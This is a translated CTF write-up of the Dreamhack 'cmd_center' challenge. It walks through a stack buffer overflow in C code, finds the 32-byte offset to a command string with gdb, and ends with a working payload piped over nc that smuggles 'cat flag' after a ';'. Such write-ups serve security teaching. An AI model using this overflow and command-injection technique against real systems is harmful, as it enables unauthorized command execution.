# dreamhack.io: cmd_center

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224285314237). Translated and reformatted in English.

The C code provided in the problem is as follows.

char cmd_ip[256] = "ifconfig";
int dummy;
char center_name[24];

printf("Center name: ");
read(0, center_name, 100);

if (!strncmp(cmd_ip, "ifconfig", 8)) {
 system(cmd_ip);
}
else {
 printf("Something is wrong!\n");
}

The key vulnerability here is that it receives input that is much larger than the size of the center_name array.

center_name is only 24 bytes, but read() accepts input of up to 100 bytes.

Therefore, the stack area behind center_name can be overwritten.

The goal of this problem is to manipulate the cmd_ip value to force system(cmd_ip) to run commands other than ifconfig.

2. Important conditions

If you look at the code, system(cmd_ip) is not executed immediately, but the conditions below are first checked.

strncmp(cmd_ip, "ifconfig", 8)

In other words, the first 8 bytes of cmd_ip must be the same as "ifconfig".

Therefore, you should not simply change cmd_ip to:

cat flag

In this case, the conditional statement does not pass because the first 8 bytes are not ifconfig.

Instead, you can use ; in a shell command to execute multiple commands in succession.

ifconfig; cat flag

If you do this, the strncmp() test is passed because the first part is ifconfig, and after ifconfig is executed in system(), the cat flag is also executed.

3. Find Offset

This problem is not a problem of covering the ret address, but a problem of covering the local variable cmd_ip on the stack.

So what you need is how many bytes are you from the start position of center_name to the start position of cmd_ip?

In other words, it is offset.

If you disassemble the main function in gdb, you can check the following.

0x916 <+105>: lea -0x130(%rbp),%rax
0x91d <+112>: mov $0x64,%edx
0x922 <+117>: mov %rax,%rsi
0x925 <+120>: mov $0x0,%edi
0x92a <+125>: call read@plt

The second argument of the read() function is the buffer address to store the input.

In x86-64 Linux, function arguments are passed to the next register.

1st argument: rdi

2nd argument: rsi

3rd argument: rdx

Here, just before the read() call:

lea -0x130(%rbp), %rax

mov %rax, %rsi

Since there is, the location where the input is saved is as follows.

center_name = rbp - 0x130

That is, center_name is located at rbp - 0x130.

Next, check where cmd_ip is located.

0x92f <+130>: lea -0x110(%rbp),%rax
0x936 <+137>: mov $0x8,%edx
0x93b <+142>: lea 0xd0(%rip),%rsi
0x942 <+149>: mov %rax,%rdi
0x945 <+152>: call strncmp@plt

The first argument of strncmp() is cmd_ip, the string to be compared.

On x86-64 Linux, the first argument is passed as rdi.

Just before the call:

lea -0x110(%rbp), %rax

mov %rax, %rdi

Therefore, the location of cmd_ip is as follows.

cmd_ip = rbp - 0x110

Now we just need to calculate the distance between the two variables.

center_name = rbp - 0x130

cmd_ip = rbp - 0x110

The difference is:

0x130 - 0x110 = 0x20

0x20 is 32 in decimal.

0x20 = 32 bytes

Therefore, if you fill 32 bytes from the starting position of center_name, cmd_ip can be overwritten from then on.

In other words, the payload structure is as follows.

"A" * 32 + "ifconfig; cat flag"

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"ifconfig; cat flag\x00")' | nc host8.dreamhack.games 14389
